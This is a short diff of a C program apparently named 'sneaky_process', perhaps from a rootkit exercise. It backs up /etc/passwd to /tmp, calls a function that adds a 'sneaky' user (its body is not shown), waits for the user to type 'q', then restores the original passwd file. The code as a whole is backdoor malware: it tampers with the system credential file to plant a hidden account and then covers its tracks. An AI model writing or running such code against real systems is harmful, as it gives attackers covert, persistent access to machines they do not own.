@@ -1,12 +1,12 @@
 #include<stdio.h>
 #include<stdlib.h>
 
-void copyfile(){
+void copyfile(char source_path[256], char destination_path[256]){
   FILE *source, *destination;
   char ch;
   
-  source = fopen("/etc/passwd", "r");
-  destination = fopen("/tmp/passwd", "w");
+  source = fopen(source_path, "r");
+  destination = fopen(destination_path, "w");
 
   if(source == NULL || destination == NULL){
     fclose(source);
@@ -39,7 +39,18 @@ void addSneakyUser(){
 int main(int argc, char* argv[]){
   int current_pid = getpid();
   printf("sneaky_process pid = %d\n", current_pid);
-  copyfile();
+  copyfile("/etc/passwd", "/tmp/passwd");
   addSneakyUser();
+
+  while(1){
+    char input;
+    scanf("%c", &input);
+    if(input== 'q'){
+      break;
+    }
+  }
+
+  copyfile("/tmp/passwd", "/etc/passwd");
+    
   return 0;
 }
